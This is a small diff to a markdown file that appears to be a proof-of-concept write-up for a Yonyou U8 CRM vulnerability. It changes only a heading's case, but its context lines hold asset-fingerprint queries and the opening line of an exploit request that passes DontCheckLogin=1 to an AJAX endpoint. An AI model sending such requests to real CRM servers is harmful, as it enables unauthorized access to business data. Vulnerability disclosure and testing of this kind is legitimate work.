@@ -14,7 +14,7 @@ app.name="用友 CRM"
 title="用友U8CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /ajax/getufvouchdata.php?DontCheckLogin=1&Action=getRelations HTTP/1.1
